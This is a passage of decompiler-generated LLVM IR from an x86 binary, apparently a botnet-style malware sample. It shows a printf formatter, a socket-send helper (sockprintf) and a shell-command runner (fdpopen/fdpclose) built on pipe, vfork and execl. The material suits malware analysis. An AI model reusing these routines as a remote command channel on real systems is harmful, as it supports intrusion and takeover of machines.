  %v5_8048617 = add i32 %stack_var_8.4.in41, 2
  %v22_8048617 = inttoptr i32 %v5_8048617 to i8*
  br label %dec_label_pc_804862a.preheader

dec_label_pc_804862a.preheader:                   ; preds = %dec_label_pc_8048617, %dec_label_pc_804860d
  %stack_var_8.0.ph = phi i8* [ %v22_80485e1, %dec_label_pc_804860d ], [ %v22_8048617, %dec_label_pc_8048617 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804860d ], [ 1, %dec_label_pc_8048617 ]
  %v4_804862a22 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_804862d23 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_804863030 = icmp eq i8 %v2_804862d23, 48
  br i1 %v7_804863030, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048623:                             ; preds = %dec_label_pc_804862a.preheader, %dec_label_pc_8048623
  %v4_804862a33 = phi i32 [ %v5_8048623, %dec_label_pc_8048623 ], [ %v4_804862a22, %dec_label_pc_804862a.preheader ]
  %stack_var_-32.032 = phi i32 [ %v4_8048626, %dec_label_pc_8048623 ], [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ]
  %v5_8048623 = add i32 %v4_804862a33, 1
  %v22_8048623 = inttoptr i32 %v5_8048623 to i8*
  %v4_8048626 = or i32 %stack_var_-32.032, 2
  %v2_804862d = load i8, i8* %v22_8048623, align 1
  %v7_8048630 = icmp eq i8 %v2_804862d, 48
  br i1 %v7_8048630, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048659.preheader:                   ; preds = %dec_label_pc_8048623, %dec_label_pc_804862a.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_804862a.preheader ], [ %v22_8048623, %dec_label_pc_8048623 ]
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ], [ %v4_8048626, %dec_label_pc_8048623 ]
  br label %dec_label_pc_8048659

dec_label_pc_8048636:                             ; preds = %dec_label_pc_8048663
  %v2_804863f = mul i32 %stack_var_-36.0, 10
  %v2_8048647 = load i8, i8* %stack_var_8.1, align 1
  %v3_8048647 = zext i8 %v2_8048647 to i32
  %v5_804864d = add i32 %v3_8048647, %v2_804863f
  %v1_8048650 = add i32 %v5_804864d, -48
  %v5_8048656 = add i32 %v4_8048659, 1
  %v22_8048656 = inttoptr i32 %v5_8048656 to i8*
  br label %dec_label_pc_8048659

dec_label_pc_8048659:                             ; preds = %dec_label_pc_8048659.preheader, %dec_label_pc_8048636
  %stack_var_8.1 = phi i8* [ %v22_8048656, %dec_label_pc_8048636 ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048659.preheader ]
  %stack_var_-36.0 = phi i32 [ %v1_8048650, %dec_label_pc_8048636 ], [ 0, %dec_label_pc_8048659.preheader ]
  %v4_8048659 = ptrtoint i8* %stack_var_8.1 to i32
  %v2_804865c = load i8, i8* %stack_var_8.1, align 1
  %tmp = icmp ult i8 %v2_804865c, 48
  br i1 %tmp, label %dec_label_pc_804866d, label %dec_label_pc_8048663

dec_label_pc_8048663:                             ; preds = %dec_label_pc_8048659
  %v2_8048666 = load i8, i8* %stack_var_8.1, align 1
  %tmp48 = icmp ult i8 %v2_8048666, 58
  br i1 %tmp48, label %dec_label_pc_8048636, label %dec_label_pc_804866d

dec_label_pc_804866d:                             ; preds = %dec_label_pc_8048663, %dec_label_pc_8048659
  %v2_8048670 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048673 = icmp eq i8 %v2_8048670, 115
  %v1_8048675 = icmp eq i1 %v10_8048673, false
  br i1 %v1_8048675, label %dec_label_pc_80486c4, label %dec_label_pc_8048677

dec_label_pc_8048677:                             ; preds = %dec_label_pc_804866d
  %v1_804867a = add i32 %stack_var_12.142, 4
  %v1_8048682 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048682 = load i32, i32* %v1_8048682, align 4
  %v4_8048687 = icmp eq i32 %v2_8048682, 0
  br i1 %v4_8048687, label %dec_label_pc_804869c, label %dec_label_pc_804868d

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048677
  %v5_8048690 = inttoptr i32 %v2_8048682 to i8*
  br label %dec_label_pc_804869c

dec_label_pc_804869c:                             ; preds = %dec_label_pc_8048677, %dec_label_pc_804868d
  %storemerge = phi i8* [ %v5_8048690, %dec_label_pc_804868d ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805801e.12, i32 0, i32 0), %dec_label_pc_8048677 ]
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_80486b7 = call i32 @prints(i32 %tmp6, i8* %storemerge, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_80486bc = add i32 %v6_80486b7, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80486c4:                             ; preds = %dec_label_pc_804866d
  %v2_80486c7 = load i8, i8* %stack_var_8.1, align 1
  %v10_80486ca = icmp eq i8 %v2_80486c7, 100
  %v1_80486cc = icmp eq i1 %v10_80486ca, false
  br i1 %v1_80486cc, label %dec_label_pc_8048718, label %dec_label_pc_80486ce

dec_label_pc_80486ce:                             ; preds = %dec_label_pc_80486c4
  %v1_80486d1 = add i32 %stack_var_12.142, 4
  %v1_80486d9 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80486d9 = load i32, i32* %v1_80486d9, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804870b = sext i32 %v2_80486d9 to i64
  %v9_804870b = call i32 @printi(i32 %tmp6, i64 %v8_804870b, i32 10, i32 1, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048710 = add i32 %v9_804870b, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048718:                             ; preds = %dec_label_pc_80486c4
  %v2_804871b = load i8, i8* %stack_var_8.1, align 1
  %v10_804871e = icmp eq i8 %v2_804871b, 120
  %v1_8048720 = icmp eq i1 %v10_804871e, false
  br i1 %v1_8048720, label %dec_label_pc_804876c, label %dec_label_pc_8048722

dec_label_pc_8048722:                             ; preds = %dec_label_pc_8048718
  %v1_8048725 = add i32 %stack_var_12.142, 4
  %v1_804872d = inttoptr i32 %stack_var_12.142 to i32*
  %v2_804872d = load i32, i32* %v1_804872d, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804875f = sext i32 %v2_804872d to i64
  %v9_804875f = call i32 @printi(i32 %tmp6, i64 %v8_804875f, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048764 = add i32 %v9_804875f, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_804876c:                             ; preds = %dec_label_pc_8048718
  %v2_804876f = load i8, i8* %stack_var_8.1, align 1
  %v10_8048772 = icmp eq i8 %v2_804876f, 88
  %v1_8048774 = icmp eq i1 %v10_8048772, false
  br i1 %v1_8048774, label %dec_label_pc_80487c0, label %dec_label_pc_8048776

dec_label_pc_8048776:                             ; preds = %dec_label_pc_804876c
  %v1_8048779 = add i32 %stack_var_12.142, 4
  %v1_8048781 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048781 = load i32, i32* %v1_8048781, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_80487b3 = sext i32 %v2_8048781 to i64
  %v9_80487b3 = call i32 @printi(i32 %tmp6, i64 %v8_80487b3, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_80487b8 = add i32 %v9_80487b3, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80487c0:                             ; preds = %dec_label_pc_804876c
  %v2_80487c3 = load i8, i8* %stack_var_8.1, align 1
  %v10_80487c6 = icmp eq i8 %v2_80487c3, 117
  %v1_80487c8 = icmp eq i1 %v10_80487c6, false
  br i1 %v1_80487c8, label %dec_label_pc_8048811, label %dec_label_pc_80487ca

dec_label_pc_80487ca:                             ; preds = %dec_label_pc_80487c0
  %v1_80487cd = add i32 %stack_var_12.142, 4
  %v1_80487d5 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80487d5 = load i32, i32* %v1_80487d5, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_8048807 = sext i32 %v2_80487d5 to i64
  %v9_8048807 = call i32 @printi(i32 %tmp6, i64 %v8_8048807, i32 10, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_804880c = add i32 %v9_8048807, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048811:                             ; preds = %dec_label_pc_80487c0
  %v2_8048814 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048817 = icmp eq i8 %v2_8048814, 99
  %v1_8048819 = icmp eq i1 %v10_8048817, false
  br i1 %v1_8048819, label %dec_label_pc_804886f, label %dec_label_pc_804881b

dec_label_pc_804881b:                             ; preds = %dec_label_pc_8048811
  %v1_804881e = add i32 %stack_var_12.142, 4
  %v1_8048826 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048826 = load i32, i32* %v1_8048826, align 4
  store i32 %v2_8048826, i32* %stack_var_-6, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_804884a = call i32 @prints(i32 %tmp6, i8* %tmp21, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_804884f = add i32 %v6_804884a, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048854:                             ; preds = %dec_label_pc_80485ff, %dec_label_pc_80485d3
  %stack_var_8.2 = phi i8* [ %stack_var_8.444, %dec_label_pc_80485d3 ], [ %v22_80485e1, %dec_label_pc_80485ff ]
  %v2_8048857 = load i8, i8* %stack_var_8.2, align 1
  %v3_8048857 = zext i8 %v2_8048857 to i32
  %v4_8048867 = call i32 @printchar(i32* %arg1, i32 %v3_8048857)
  %v4_804886c = add i32 %stack_var_-28.143, 1
  br label %dec_label_pc_804886f

dec_label_pc_804886f:                             ; preds = %dec_label_pc_8048811, %dec_label_pc_804881b, %dec_label_pc_80487ca, %dec_label_pc_8048776, %dec_label_pc_804869c, %dec_label_pc_8048722, %dec_label_pc_80486ce, %dec_label_pc_8048854
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_8048854 ], [ %stack_var_8.1, %dec_label_pc_8048811 ], [ %stack_var_8.1, %dec_label_pc_804881b ], [ %stack_var_8.1, %dec_label_pc_80487ca ], [ %stack_var_8.1, %dec_label_pc_8048776 ], [ %stack_var_8.1, %dec_label_pc_8048722 ], [ %stack_var_8.1, %dec_label_pc_80486ce ], [ %stack_var_8.1, %dec_label_pc_804869c ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.142, %dec_label_pc_8048854 ], [ %stack_var_12.142, %dec_label_pc_8048811 ], [ %v1_804881e, %dec_label_pc_804881b ], [ %v1_80487cd, %dec_label_pc_80487ca ], [ %v1_8048779, %dec_label_pc_8048776 ], [ %v1_8048725, %dec_label_pc_8048722 ], [ %v1_80486d1, %dec_label_pc_80486ce ], [ %v1_804867a, %dec_label_pc_804869c ]
  %stack_var_-28.0 = phi i32 [ %v4_804886c, %dec_label_pc_8048854 ], [ %stack_var_-28.143, %dec_label_pc_8048811 ], [ %v5_804884f, %dec_label_pc_804881b ], [ %v5_804880c, %dec_label_pc_80487ca ], [ %v5_80487b8, %dec_label_pc_8048776 ], [ %v5_8048764, %dec_label_pc_8048722 ], [ %v5_8048710, %dec_label_pc_80486ce ], [ %v5_80486bc, %dec_label_pc_804869c ]
  %v4_804886f = ptrtoint i8* %stack_var_8.3 to i32
  %v5_804886f = add i32 %v4_804886f, 1
  %stack_var_8.4 = inttoptr i32 %v5_804886f to i8*
  %v2_8048875 = load i8, i8* %stack_var_8.4, align 1
  %v4_8048878 = icmp eq i8 %v2_8048875, 0
  %v1_804887a = icmp eq i1 %v4_8048878, false
  br i1 %v1_804887a, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_8048880:                             ; preds = %dec_label_pc_804886f, %dec_label_pc_80485e1, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.143, %dec_label_pc_80485e1 ], [ %stack_var_-28.0, %dec_label_pc_804886f ]
  %v4_8048880 = icmp eq i32* %arg1, null
  br i1 %v4_8048880, label %dec_label_pc_804888e, label %dec_label_pc_8048886

dec_label_pc_8048886:                             ; preds = %dec_label_pc_8048880
  %v2_8048889 = load i32, i32* %arg1, align 4
  %v1_804888b = inttoptr i32 %v2_8048889 to i8*
  store i8 0, i8* %v1_804888b, align 1
  br label %dec_label_pc_804888e

dec_label_pc_804888e:                             ; preds = %dec_label_pc_8048880, %dec_label_pc_8048886
  %v2_8048891 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048891, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_804886f, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 10, 11, 8, 9, 6, 7, 4, 5, 2, 3, 1, 0, 12 }
  uselistorder i8* %stack_var_8.1, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 16, 15, 13 }
  uselistorder i32 %v5_8048623, { 1, 0 }
  uselistorder i8* %v22_80485e1, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in41, { 1, 0 }
  uselistorder i32 %stack_var_12.142, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.143, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i64, i32, i32, i32, i32, i32)* @printi, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804888e, { 1, 0 }
  uselistorder label %dec_label_pc_804886f, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_804869c, { 1, 0 }
  uselistorder label %dec_label_pc_8048659, { 1, 0 }
  uselistorder label %dec_label_pc_8048623, { 1, 0 }
  uselistorder label %dec_label_pc_80485d3, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048893 = load i32, i32* @ebp, align 4
  store i32 %v0_8048893, i32* %stack_var_-4, align 4
  %v4_8048893 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048893, i32* @ebp, align 4
  %v4_804889c = ptrtoint i32* %stack_var_8 to i32
  %v4_80488b4 = call i32 @print(i32* null, i32 %arg1, i32 %v4_804889c)
  %v2_80488b9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488b9, i32* @ebp, align 4
  ret i32 %v4_80488b4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80488bb = load i32, i32* @ebp, align 4
  store i32 %v0_80488bb, i32* %stack_var_-4, align 4
  %v4_80488bb = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80488bb, i32* @ebp, align 4
  %v4_80488c4 = ptrtoint i32* %stack_var_12 to i32
  %v4_80488db = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_80488c4)
  %v2_80488e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488e0, i32* @ebp, align 4
  ret i32 %v4_80488db

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e5 = load i32, i32* @edi, align 4
  store i32 %v0_80488e5, i32* %stack_var_-8, align 4
  %v1_80488f0 = call i32 @malloc(i32 2048)
  store i32 %v1_80488f0, i32* %stack_var_-20, align 4
  %v3_8048911 = inttoptr i32 %v1_80488f0 to i8*
  %v4_8048911 = call i32 @__GI_memset(i8* %v3_8048911, i32 0, i32 2048)
  %v4_804891f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048936 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_804891f)
  %v3_804894c = call i32 @_strlen(i8* %v3_8048911)
  %v6_8048953 = add i32 %v1_80488f0, %v3_804894c
  %v1_8048956 = inttoptr i32 %v6_8048953 to i8*
  store i8 10, i8* %v1_8048956, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_80488f0, i32* @edi, align 4
  %v3_804896a = call i32 @_strlen(i8* %v3_8048911)
  %v4_804898a = call i32 @__libc_send(i32 %arg1, i32 %v1_80488f0, i32 %v3_804896a, i32 16384)
  %v1_8048998 = call i32 @free(i32 %v1_80488f0)
  %v0_80489a0 = load i32, i32* @esp, align 4
  %v5_80489a0 = icmp ugt i32 %v0_80489a0, -53
  store i1 %v5_80489a0, i1* @cf, align 1
  %v2_80489a3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80489a3, i32* @edi, align 4
  ret i32 %v4_804898a

; uselistorder directives
  uselistorder i32 %v1_80488f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80489a9 = load i32, i32* @edi, align 4
  store i32 %v0_80489a9, i32* %stack_var_-8, align 4
  %v4_80489ad = ptrtoint i8* %arg2 to i32
  %v2_80489b0 = load i8, i8* %arg2, align 1
  %v10_80489b3 = icmp eq i8 %v2_80489b0, 114
  br i1 %v10_80489b3, label %dec_label_pc_80489c1, label %dec_label_pc_80489b7

dec_label_pc_80489b7:                             ; preds = %entry
  %v2_80489ba = load i8, i8* %arg2, align 1
  %v10_80489bd = icmp eq i8 %v2_80489ba, 119
  %v1_80489bf = icmp eq i1 %v10_80489bd, false
  br i1 %v1_80489bf, label %dec_label_pc_8048b83, label %dec_label_pc_80489c1

dec_label_pc_80489c1:                             ; preds = %dec_label_pc_80489b7, %entry
  %v1_80489c4 = add i32 %v4_80489ad, 1
  %v1_80489c5 = inttoptr i32 %v1_80489c4 to i8*
  %v2_80489c5 = load i8, i8* %v1_80489c5, align 1
  %v4_80489c8 = icmp eq i8 %v2_80489c5, 0
  br i1 %v4_80489c8, label %dec_label_pc_80489d8, label %dec_label_pc_8048b83

dec_label_pc_80489d8:                             ; preds = %dec_label_pc_80489c1
  %v2_80489d8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80489de = call i32 @__GI_pipe(i32 %v2_80489d8)
  %v2_80489e3 = icmp slt i32 %v2_80489de, 0
  %v1_80489e5 = icmp eq i1 %v2_80489e3, false
  br i1 %v1_80489e5, label %dec_label_pc_80489f3, label %dec_label_pc_8048b83

dec_label_pc_80489f3:                             ; preds = %dec_label_pc_80489d8
  %v0_80489f3 = load i8*, i8** @global_var_805f560.13, align 4
  %v2_80489f8 = icmp eq i8* %v0_80489f3, null
  %v1_80489fa = icmp eq i1 %v2_80489f8, false
  br i1 %v1_80489fa, label %bb, label %dec_label_pc_80489fc

dec_label_pc_80489fc:                             ; preds = %dec_label_pc_80489f3
  %v0_80489fc = call i32 @getdtablesize()
  %tmp19 = icmp slt i32 %v0_80489fc, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8048a16, label %dec_label_pc_8048b83

dec_label_pc_8048a16:                             ; preds = %dec_label_pc_80489fc
  %v2_8048a19 = mul i32 %v0_80489fc, 4
  %v2_8048a1f = call i32 @malloc(i32 %v2_8048a19)
  %v1_8048a24 = inttoptr i32 %v2_8048a1f to i8*
  store i8* %v1_8048a24, i8** @global_var_805f560.13, align 32
  %v2_8048a2e = icmp eq i32 %v2_8048a1f, 0
  %v1_8048a30 = icmp eq i1 %v2_8048a2e, false
  br i1 %v1_8048a30, label %dec_label_pc_8048a3e, label %dec_label_pc_8048b83

dec_label_pc_8048a3e:                             ; preds = %dec_label_pc_8048a16
  %v1_8048a41 = mul i32 %v0_80489fc, 4
  store i32 %v2_8048a1f, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048a52 = and i32 %v2_8048a1f, -256
  %v5_8048a54 = call i8* @_memset(i8* %v1_8048a24, i32 %v1_8048a52, i32 %v1_8048a41)
  br label %bb

bb:                                               ; preds = %dec_label_pc_80489f3, %dec_label_pc_8048a3e
  %v1_8048a56 = call i32 @__vfork(i32 %tmp11)
  %v13_8048a64 = icmp eq i32 %v1_8048a56, -1
  br i1 %v13_8048a64, label %dec_label_pc_8048a75, label %dec_label_pc_8048a6a

dec_label_pc_8048a6a:                             ; preds = %bb
  %v4_8048a6a = icmp eq i32 %v1_8048a56, 0
  %v2_8048a9a = load i8, i8* %arg2, align 1
  %v10_8048a9d = icmp eq i8 %v2_8048a9a, 114
  %v1_8048a9f = icmp eq i1 %v10_8048a9d, false
  br i1 %v4_8048a6a, label %dec_label_pc_8048a97, label %dec_label_pc_8048b3b

dec_label_pc_8048a75:                             ; preds = %bb
  %v3_8048a75 = load i32, i32* %stack_var_-24, align 4
  %v2_8048a7b = call i32 @__libc_close(i32 %v3_8048a75)
  %v2_8048a86 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b83

dec_label_pc_8048a97:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048ad4, label %dec_label_pc_8048aa1

dec_label_pc_8048aa1:                             ; preds = %dec_label_pc_8048a97
  %v9_8048aa4 = icmp eq i32 %tmp7, 1
  br i1 %v9_8048aa4, label %dec_label_pc_8048ac7, label %dec_label_pc_8048aa9

dec_label_pc_8048aa9:                             ; preds = %dec_label_pc_8048aa1
  %v4_8048ab7 = call i32 @dup2(i32 %tmp7, i32 1)
  %v2_8048ac2 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048ac7

dec_label_pc_8048ac7:                             ; preds = %dec_label_pc_8048aa1, %dec_label_pc_8048aa9
  %v3_8048ac7 = load i32, i32* %stack_var_-24, align 4
  %v2_8048acd = call i32 @__libc_close(i32 %v3_8048ac7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048ad4:                             ; preds = %dec_label_pc_8048a97
  %v3_8048ad4 = load i32, i32* %stack_var_-24, align 4
  %v1_8048ad7 = icmp eq i32 %v3_8048ad4, 0
  br i1 %v1_8048ad7, label %dec_label_pc_8048af9, label %dec_label_pc_8048adb

dec_label_pc_8048adb:                             ; preds = %dec_label_pc_8048ad4
  %v4_8048ae9 = call i32 @dup2(i32 %v3_8048ad4, i32 0)
  %v3_8048aee = load i32, i32* %stack_var_-24, align 4
  %v2_8048af4 = call i32 @__libc_close(i32 %v3_8048aee)
  br label %dec_label_pc_8048af9

dec_label_pc_8048af9:                             ; preds = %dec_label_pc_8048ad4, %dec_label_pc_8048adb
  %v2_8048aff = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048b04:                             ; preds = %dec_label_pc_8048ac7, %dec_label_pc_8048af9
  %v8_8048b2a = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_8058028.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_8057cdb.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_8058025.14 to i32), i32 %arg1, i32 0)
  %v2_8048b36 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048b3b:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048b58, label %dec_label_pc_8048b45

dec_label_pc_8048b45:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b45 = load i32, i32* %stack_var_-24, align 4
  %v2_8048b51 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b58:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b5e = load i32, i32* %stack_var_-24, align 4
  %v2_8048b64 = call i32 @__libc_close(i32 %v3_8048b5e)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b69:                             ; preds = %dec_label_pc_8048b45, %dec_label_pc_8048b58
  %stack_var_-28.0 = phi i32 [ %tmp7, %dec_label_pc_8048b58 ], [ %v3_8048b45, %dec_label_pc_8048b45 ]
  %v2_8048b6c = mul i32 %stack_var_-28.0, 4
  %v0_8048b71 = load i8*, i8** @global_var_805f560.13, align 4
  %v1_8048b71 = ptrtoint i8* %v0_8048b71 to i32
  %v2_8048b76 = add i32 %v1_8048b71, %v2_8048b6c
  %v2_8048b7b = inttoptr i32 %v2_8048b76 to i32*
  store i32 %v1_8048a56, i32* %v2_8048b7b, align 4
  br label %dec_label_pc_8048b83

dec_label_pc_8048b83:                             ; preds = %dec_label_pc_8048a16, %dec_label_pc_80489fc, %dec_label_pc_80489d8, %dec_label_pc_80489b7, %dec_label_pc_80489c1, %dec_label_pc_8048a75, %dec_label_pc_8048b69
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_8048a75 ], [ %stack_var_-28.0, %dec_label_pc_8048b69 ], [ -1, %dec_label_pc_80489c1 ], [ -1, %dec_label_pc_80489b7 ], [ -1, %dec_label_pc_80489d8 ], [ -1, %dec_label_pc_80489fc ], [ -1, %dec_label_pc_8048a16 ]
  %v2_8048b89 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048b89, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v1_8048a56, { 1, 2, 0 }
  uselistorder i32 %v0_80489fc, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 1, 6, 5, 4, 3, 0, 2 }
  uselistorder i8* %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048b83, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048b69, { 1, 0 }
  uselistorder label %dec_label_pc_8048b04, { 1, 0 }
  uselistorder label %dec_label_pc_8048af9, { 1, 0 }
  uselistorder label %dec_label_pc_8048ac7, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048b8c = load i32, i32* @ebp, align 4
  store i32 %v0_8048b8c, i32* %stack_var_-4, align 4
  %v0_8048b95 = load i8*, i8** @global_var_805f560.13, align 4
  %v2_8048b9a = icmp eq i8* %v0_8048b95, null
  br i1 %v2_8048b9a, label %dec_label_pc_8048cf9, label %dec_label_pc_8048b9e

dec_label_pc_8048b9e:                             ; preds = %entry
  %v1_8048b95 = ptrtoint i8* %v0_8048b95 to i32
  %v2_8048ba1 = mul i32 %arg1, 4
  %v2_8048bab = add i32 %v1_8048b95, %v2_8048ba1
  %v1_8048bae = inttoptr i32 %v2_8048bab to i32*
  %v2_8048bae = load i32, i32* %v1_8048bae, align 4
  %v1_8048bb0 = icmp eq i32 %v2_8048bae, 0
  %v1_8048bb2 = icmp eq i1 %v1_8048bb0, false
  br i1 %v1_8048bb2, label %dec_label_pc_8048bc3, label %dec_label_pc_8048cf9

dec_label_pc_8048bc3:                             ; preds = %dec_label_pc_8048b9e
  %v1_8048bc9 = call i32 @__libc_close(i32 %arg1)
  %v2_8048bce = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048bd7 = call i32 @sigemptyset(i32 %v2_8048bce)
  %v2_8048bed = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 2)
  %v2_8048c03 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 3)
  %v2_8048c19 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 1)
  %v4_8048c24 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048c39 = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048c39 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048c39, i32 %v4_8048c24)
  %v2_8048c58 = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048c3e

dec_label_pc_8048c3e:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048bc3
  %v0_8048c46 = load i8*, i8** @global_var_805f560.13, align 4
  %v1_8048c46 = ptrtoint i8* %v0_8048c46 to i32
  %v2_8048c4b = add i32 %v1_8048c46, %v2_8048ba1
  %v1_8048c4e = inttoptr i32 %v2_8048c4b to i32*
  %v2_8048c4e = load i32, i32* %v1_8048c4e, align 4
  %v3_8048c65 = call i32 @__libc_waitpid(i32 %v2_8048c4e, i32 %v2_8048c58, i32 0)
  %v13_8048c70 = icmp eq i32 %v3_8048c65, -1
  %v1_8048c77 = icmp eq i1 %v13_8048c70, false
